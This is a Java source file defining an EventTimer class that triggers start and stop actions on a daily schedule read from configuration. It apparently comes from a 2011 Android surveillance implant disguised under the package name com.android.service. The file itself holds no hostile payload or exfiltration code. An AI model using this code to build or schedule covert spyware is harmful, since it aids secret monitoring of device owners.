/* **********************************************
 * Create by : Alberto "Quequero" Pelliccione
 * Company   : HT srl
 * Project   : AndroidService
 * Created   : 30-mar-2011
 **********************************************/

package com.android.service.event;

import java.io.IOException;
import java.text.DateFormat;
import java.text.ParseException;
import java.util.Calendar;
import java.util.Date;
import java.util.GregorianCalendar;
import java.util.TimeZone;

import com.android.service.auto.Cfg;
import com.android.service.conf.ConfigurationException;
import com.android.service.util.Check;
import com.android.service.util.DataBuffer;

/**
 * The Class TimerEvent.
 */
public class EventTimer extends BaseTimer {
	/** The Constant TAG. */
	private static final String TAG = "EventTimer"; //$NON-NLS-1$

	/** The Constant SLEEP_TIME. */
	private static final int SLEEP_TIME = 1000;

	boolean nextDailyIn;

	/** The type. */
	private int type;

	long start, stop;

	private final long oneDayMs = 24 * 3600 * 1000;

	private Date timestart;

	private Date timestop;

	/**
	 * Instantiates a new timer event.
	 */
	public EventTimer() {
		if (Cfg.DEBUG) {
			Check.log(TAG + " TimerEvent constructor");//$NON-NLS-1$
		}
	}

	/*
	 * (non-Javadoc)
	 * 
	 * @see
	 * com.ht.AndroidServiceGUI.event.EventBase#parse(com.ht.AndroidServiceGUI
	 * .event .Event)
	 */
	@Override
	public boolean parse(final EventConf conf) {
		try {
			String ts = conf.getString("ts");
			String te = conf.getString("te");

			timestart = DateFormat.getDateInstance().parse(ts);
			timestop = DateFormat.getDateInstance().parse(te);

			if (Cfg.DEBUG) {
				Check.log(TAG + " type: " + type + " ts:" + ts + " te:" + te);//$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$
			}
		} catch (final ConfigurationException e) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " Error: params FAILED " + e);//$NON-NLS-1$
			}

			return false;
		} catch (ParseException e) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " Error: params FAILED " + e);//$NON-NLS-1$
			}

			return false;
		}

		return true;
	}

	/*
	 * (non-Javadoc)
	 * 
	 * @see com.ht.AndroidServiceGUI.event.EventBase#begin()
	 */
	@Override
	public void begin() {
		final long now = System.currentTimeMillis();

		Calendar calendar = GregorianCalendar.getInstance(TimeZone.getTimeZone("GMT"));

		long nextStart, nextStop;

		calendar.setTime(timestart);
		start = ((calendar.get(Calendar.HOUR_OF_DAY) * 3600) + (calendar.get(Calendar.MINUTE) * 60) + calendar
				.get(Calendar.SECOND)) * 1000;

		calendar.setTime(timestop);
		stop = ((calendar.get(Calendar.HOUR_OF_DAY) * 3600) + (calendar.get(Calendar.MINUTE) * 60) + calendar
				.get(Calendar.SECOND)) * 1000;

		nextDailyIn = setDailyDelay();
		if (!nextDailyIn) {
			triggerStartAction();
			setPeriod(getDelay());
		}

	}

	private boolean setDailyDelay() {
		Calendar nowCalendar = GregorianCalendar.getInstance(TimeZone.getTimeZone("GMT"));

		long nextStart, nextStop;

		int now = ((nowCalendar.get(Calendar.HOUR_OF_DAY) * 3600) + (nowCalendar.get(Calendar.MINUTE) * 60) + nowCalendar
				.get(Calendar.SECOND)) * 1000;

		// Estriamo il prossimo evento e determiniamo il delay sulla base del
		// tipo
		if (start > now)
			nextStart = start;
		else
			nextStart = start + (3600 * 24 * 1000); // 1 Day

		if (stop > now)
			nextStop = stop;
		else
			nextStop = stop + (3600 * 24 * 1000); // 1 Day

		if (nextStop > nextStart) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (setDailyDelay): Delay (next start): " + (nextStart - now)); //$NON-NLS-1$
			}
			setPeriod(nextStart - now);
			return true;
		} else {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (setDailyDelay): Delay (next stop): " + (nextStop - now)); //$NON-NLS-1$
			}

			long delay = nextStop - now;
			
			setPeriod(nextStop - now);
			return false;
		}
	}

	/*
	 * (non-Javadoc)
	 * 
	 * @see com.ht.AndroidServiceGUI.ThreadBase#go()
	 */
	@Override
	public void go() {
		if (Cfg.DEBUG) {
			Check.log(TAG + " Info: " + "triggering");//$NON-NLS-1$ //$NON-NLS-2$
		}

		if (nextDailyIn) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (go): DAILY TIMER: action enter"); //$NON-NLS-1$
			}
			triggerStartAction();
		} else {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (go): DAILY TIMER: action exit"); //$NON-NLS-1$
			}
			triggerStopAction();
		}

		if (Cfg.DEBUG) {
			Check.log(TAG + " (go): daily IN BEFORE: " + nextDailyIn); //$NON-NLS-1$
		}
		nextDailyIn = setDailyDelay();
		if (Cfg.DEBUG) {
			Check.log(TAG + " (go): daily IN AFTER: " + nextDailyIn); //$NON-NLS-1$
		}

	}

	/*
	 * (non-Javadoc)
	 * 
	 * @see com.ht.AndroidServiceGUI.event.EventBase#end()
	 */
	@Override
	public void end() {

	}
}
